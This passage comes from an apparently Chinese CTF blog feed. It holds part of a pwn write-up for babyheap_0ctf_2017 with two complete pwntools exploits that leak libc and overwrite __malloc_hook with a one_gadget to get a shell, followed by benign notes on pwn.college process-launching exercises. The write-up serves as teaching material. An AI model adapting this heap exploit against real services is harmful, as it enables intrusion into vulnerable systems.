__libc_lock_unlock(av-&gt;mutex);<br>                locked = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload= <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>)<br>fill(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload) <br><span class="hljs-comment">#由下图可见将chunk1_size成功改为了0x70，由于chunk2头位于chunk1的content中所以无法识别</span><br><span class="hljs-comment">#所以parseheap识别出的是chunk1的content段后自行填充的next_chunk的size值</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20220725213852928.png" alt="0xd"></p></li><li><p>free chunk1使fake_chunk进入fastbin中，<code>allocate(0x60)</code>,重新将获取chunk1，因为程序中调用的时calloc，内容全部置零</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">1</span>) <span class="hljs-comment">#因为使用dump输出content时，输出的大小需要在allocate的size之内，所以需要重新分配chunk</span><br>allocate(<span class="hljs-number">0x60</span>)   <span class="hljs-comment">#由下图可见重新分配的chunk1内容被置0</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20220725214635353.png" alt="0xe"></p></li><li><p>直接通过Fill函数手动修改chunk2的头部，free chunk2然后通过dump chunk1泄露地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload= <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>)<br>fill(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>allocate(<span class="hljs-number">0x50</span>) <span class="hljs-comment">#防止free掉的chunk2与topchunk合并</span><br>free(<span class="hljs-number">2</span>) <span class="hljs-comment">#由下图可见unsortedbin中 free掉的chunk2里fd和bk都已经指向了main_arena+88的位置</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20220725222331747.png" alt="0xf"></p></li><li><p>泄露libc基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">dump(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content: \n&quot;</span>)<br>p.recv(<span class="hljs-number">0x50</span>)<br>main_aren88 = u64(p.recv(<span class="hljs-number">8</span>))<br>main_arena_offset = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span> <span class="hljs-comment">#wiki上获取基址的方法 </span><br>libc_base = arena_addr - main_arena_offset<br></code></pre></td></tr></table></figure><p><img src="/img/image-20220725224226130.png" alt="0x10"></p></li></ol><p>接下来就是使用<code>arbitrary alloc</code> 利用<code>__malloc_hook</code>获取shell</p><p>分析一下当前的chunk状况</p><p><img src="/img/babyheap_0ctf_2017_1.png" alt="0x11"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#allocate一个新chunk2，用以arbitrary alloc</span><br><span class="hljs-comment">#chunk2是从unsorted chunk中分割得来，chunk分布如下(chunk3位置不变，图未截全)</span><br></code></pre></td></tr></table></figure><p><img src="/img/babyheap_0ctf_2017_2.png" alt="0x12"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#此时采用arbitrary alloc的思想，通过修改chunk2的fd实现任意位置chunk修改</span><br>free(<span class="hljs-number">2</span>)<br>fake_chunk_addr = arena_addr - <span class="hljs-number">0x33</span><br>payload= <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(fake_chunk_addr)<br>fill(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(payload), payload)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20220726004159403.png" alt="0x13"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#fill以覆盖__malloc_hook，执行one_gadget</span><br>allocate(<span class="hljs-number">0x60</span>)<br>allocate(<span class="hljs-number">0x60</span>)<br>one_gadget_addr = libc_base + <span class="hljs-number">0x4526a</span><br>payload = <span class="hljs-number">0x13</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)<br>fill(<span class="hljs-number">4</span>, <span class="hljs-built_in">len</span>(payload), payload)<br>allocate(<span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20220726004454370.png" alt="0x14"></p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#方法1</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26522</span> )<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">offset_bin_main_arena</span>(<span class="hljs-params">idx</span>):<br>    word_bytes = context.word_size / <span class="hljs-number">8</span><br>    offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>    offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br>    offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># offset fastbin</span><br>    offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>    offset += idx * <span class="hljs-number">2</span> * word_bytes  <span class="hljs-comment"># idx</span><br>    offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br>    <span class="hljs-keyword">return</span> offset<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>        gdb.attach(p)<br>        pause()<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allocate</span>(<span class="hljs-params">size</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx, size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>    p.send(content)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#通过chunk2泄露libc基址</span><br>allocate(<span class="hljs-number">0x10</span>)<br>allocate(<span class="hljs-number">0x10</span>)<br>allocate(<span class="hljs-number">0x10</span>)<br>allocate(<span class="hljs-number">0x10</span>)<br>allocate(<span class="hljs-number">0x80</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(payload), payload)<br>payload = <span class="hljs-number">0x10</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-built_in">len</span>(payload), payload)<br>allocate(<span class="hljs-number">0x10</span>)<br>allocate(<span class="hljs-number">0x10</span>)<br>payload = <span class="hljs-number">0x10</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-built_in">len</span>(payload), payload)<br>allocate(<span class="hljs-number">0x80</span>)<br>free(<span class="hljs-number">4</span>)<br>dump(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content: \n&quot;</span>)<br>arena_addr = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">88</span><br><span class="hljs-comment">#print(hex(arena_addr))</span><br>main_arena_offset = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span> <span class="hljs-comment">#wiki上获取基址的方法 </span><br>libc_base = arena_addr - main_arena_offset<br><span class="hljs-comment">#print(hex(libc_base))</span><br>leak(<span class="hljs-string">&#x27;libc base addr&#x27;</span>,libc_base)<br><span class="hljs-comment">#以下实现在__malloc_hook附近分配chunk覆盖__malloc_hook，</span><br>allocate(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">4</span>)<br>fake_chunk_addr = arena_addr - <span class="hljs-number">0x33</span><br>fake_chunk = p64(fake_chunk_addr)<br>fill(<span class="hljs-number">2</span>, <span class="hljs-built_in">len</span>(fake_chunk), fake_chunk)<br>allocate(<span class="hljs-number">0x60</span>)<br>allocate(<span class="hljs-number">0x60</span>)<br>one_gadget_addr = libc_base + <span class="hljs-number">0x4526a</span><br>payload = <span class="hljs-number">0x13</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)<br>fill(<span class="hljs-number">6</span>, <span class="hljs-built_in">len</span>(payload), payload)<br>allocate(<span class="hljs-number">0x100</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#方法2</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26522</span>)<br><span class="hljs-comment">#函数定义与方法一相同</span><br>allocate(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#0</span><br>allocate(<span class="hljs-number">0x40</span>) <span class="hljs-comment">#1</span><br>allocate(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#2</span><br>payload= <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>payload= <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>)<br>fill(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>free(<span class="hljs-number">1</span>)<br>allocate(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#1</span><br>payload= <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>)<br>fill(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>allocate(<span class="hljs-number">0x50</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">2</span>)<br>dump(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content: \n&quot;</span>)<br>p.recv(<span class="hljs-number">0x50</span>)<br>main_aren88 = u64(p.recv(<span class="hljs-number">8</span>))<br>arena_addr = main_aren88 - <span class="hljs-number">88</span><br><span class="hljs-comment">#print(hex(arena_addr))</span><br>main_arena_offset = ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span> <span class="hljs-comment">#wiki上获取基址的方法 </span><br>libc_base = arena_addr - main_arena_offset<br>leak(<span class="hljs-string">&#x27;libc base addr&#x27;</span>,libc_base)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#以下实现在__malloc_hook附近分配chunk覆盖__malloc_hook，</span><br>allocate(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">2</span>)<br>fake_chunk_addr = arena_addr - <span class="hljs-number">0x33</span><br>payload= <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(fake_chunk_addr)<br>fill(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(payload), payload)<br>allocate(<span class="hljs-number">0x60</span>)<br>allocate(<span class="hljs-number">0x60</span>)<br>one_gadget_addr = libc_base + <span class="hljs-number">0x4526a</span><br>payload = <span class="hljs-number">0x13</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)<br>fill(<span class="hljs-number">4</span>, <span class="hljs-built_in">len</span>(payload), payload)<br>allocate(<span class="hljs-number">0x100</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>heap</tag>
      
      <tag>buu刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwncollege - embryoio</title>
    <link href="/2022/06/15/pwncollege%20-%20embryoio/"/>
    <url>/2022/06/15/pwncollege%20-%20embryoio/</url>
    
    <content type="html"><![CDATA[<p>前些日子在某知识星球了解到了pwn.college，ASU CSE466的课程网站。站内module简单且较成体系，希望刷完能有所得。第一章，emryoio从 5&#x2F;15 断断续续做到 6&#x2F;15 终于把142道都做完了。鉴于网站规则，不能上传具体的题解，主要记录一下知识点。</p><span id="more"></span><h1 id="level1-7-Basic"><a href="#level1-7-Basic" class="headerlink" title="level1-7 Basic"></a>level1-7 Basic</h1><p>直接运行文件 </p><hr><p>传参直接在文件名后接参数</p><hr><p><code>export</code> 设置环境变量</p><hr><p>重定向输入（&gt;）与输出 ( &lt; )</p><hr><p><code>env -i</code> + 运行文件 忽略环境变量运行程序</p><h1 id="level8-14-shell脚本"><a href="#level8-14-shell脚本" class="headerlink" title="level8-14 shell脚本"></a>level8-14 shell脚本</h1><p>编写shell脚本 </p><p>（<code>env -i</code> ）&#x2F; challenge&#x2F;embryoio_level + 参数 （+ redirect ）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>exec -c /challenge/embryo* #直接将运行脚本的进程替换为运行challenge的进程 运行时的parent是shell脚本之上的interactive shell<br>env -i /challenge/embryo <br>bash -c &quot;exec -c /challenge/embryo&quot;# 在sub shell运行“”内的指令<br>(<br>exec -c /challenge/embryo*<br>) #在sub shell运行“”内的指令<br> <br></code></pre></td></tr></table></figure><h1 id="level15-21-ipython"><a href="#level15-21-ipython" class="headerlink" title="level15-21 ipython"></a>level15-21 ipython</h1><p><strong>ipython</strong> 直接执行shell命令 “ ！+指令” （<strong>该情况python launch 一个shell用来launch process</strong>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br>p=subprocess.Popen([<span class="hljs-string">&quot;/challenge/embryoio_level&quot;</span>], stdout=subprocess.PIPE.stdin=subprocess.PIPE)<br>p.stdout.read()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>p=pwn.process([<span class="hljs-string">&quot;/challenge/embryoio_level&quot;</span>] + [参数], env=&#123;<span class="hljs-string">&quot;环境变名&quot;</span>:<span class="hljs-string">&quot;值&quot;</span>&#125;, stdout=pwn.PIPE.stdin=pwn.PIPE)<br><span class="hljs-built_in">print</span> (p.read().decode())<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br>glob.glob(<span class="hljs-string">&quot;....&quot;</span>)<span class="hljs-comment">#需要一个参数用来指定匹配的路径字符串，其返回文件名只包括当前目录里的文件名。</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;filename&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<span class="hljs-keyword">as</span> x:<br>    x.write(<span class="hljs-string">&quot;asdf&quot;</span>)<br>p=pwn.process([<span class="hljs-string">&quot;/challenge/embryoio_level&quot;</span>], stdout=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;filename&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),stdin=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;fliename&quot;</span>))<br><span class="hljs-comment">#  redirect</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># os也能够对环境变量进行操作</span><br><span class="hljs-keyword">import</span> os<br>os.environ[<span class="hljs-string">&#x27;name&#x27;</span>]=<span class="hljs-string">&quot;value&quot;</span> <span class="hljs-comment">#设置环境变量</span><br>os.environ.get(<span class="hljs-string">&#x27;name&#x27;</span>) <span class="hljs-comment">#获取环境变量</span><br>os.getenv(<span class="hljs-string">&#x27;path&#x27;</span>) <span class="hljs-comment">#获取环境变量</span><br><span class="hljs-keyword">del</span> os.environ[<span class="hljs-string">&#x27;name&#x27;</span>]<br></code></pre></td></tr></table></figure><h1 id="level22-28-python脚本"><a href="#level22-28-python脚本" class="headerlink" title="level22-28 python脚本"></a>level22-28 python脚本</h1><p>同Ipython</p><p><strong>level27</strong> 遇到 redirect 指定file 到stdout，文件未被写入的问题。通过查阅pwntools文档，使用**wait_for_close()**。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>wait_for_close(timeout=pwnlib.timeout.Timeout.default)<br>wait(timeout=pwnlib.timeout.Timeout.default)<br><span class="hljs-comment"># Waits until the tube is closed.</span><br><span class="hljs-comment"># Python会先将数据临时存储到缓冲区中，只有使用 close() 函数关闭文件时，才会将缓冲区中的数据真正写入文件中。</span><br></code></pre></td></tr></table></figure><h1 id="level29-35-C脚本"><a href="#level29-35-C脚本" class="headerlink" title="level29-35 C脚本"></a>level29-35 C脚本</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">char</span> *参数[]=&#123;<span class="hljs-string">&quot;fliename&quot;</span>,参数<span class="hljs-number">1</span>,<span class="hljs-literal">NULL</span>&#125;<br>    <span class="hljs-type">char</span> *环境[]=&#123;<span class="hljs-string">&quot;环境变量=值&quot;</span>,<span class="hljs-literal">NULL</span>&#125;<br>    <span class="hljs-type">int</span> i = fork();<span class="hljs-comment">//fork creates a new child</span><br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<span class="hljs-comment">//execv replace the current process</span><br>    &#123;<br>        execve(argv[<span class="hljs-number">1</span>],<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>); <span class="hljs-comment">//execl  </span><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        waitpid(i, <span class="hljs-literal">NULL</span> , <span class="hljs-number">0</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="main函数的参数"><a href="#main函数的参数" class="headerlink" title="main函数的参数"></a>main函数的参数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span>=<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>    1. <span class="hljs-type">int</span> <span class="hljs-title function_">argc</span> <span class="hljs-params">(arguments count 参数计数)</span><br> 运行程序传送给main函数的命令行参数总个数，包括可执行文件的文件名，存储在argv[0]中<br>    2. <span class="hljs-type">char</span> **<span class="hljs-title function_">argv</span> <span class="hljs-params">(arguments value/<span class="hljs-built_in">vector</span> 参数值)</span><br> argv[0]指向程序运行时的全路径名<br> argv[1]指向程序在DOS命令中执行程序名后的第一个字符串<br> argv[2]指向第二个字符串<br> argc[argc] 为<span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure><h2 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h2><p>fork执行后有两次返回</p><ol><li>在父进程中，fork返回新创建子进程的进程ID；</li><li>在子进程中，fork返回0；</li><li>如果出现错误，fork返回一个负值；</li></ol><h2 id="execve函数"><a href="#execve函数" class="headerlink" title="execve函数"></a>execve函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">execl</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg, ...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execlp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg, ...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execle</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg, ..., <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span 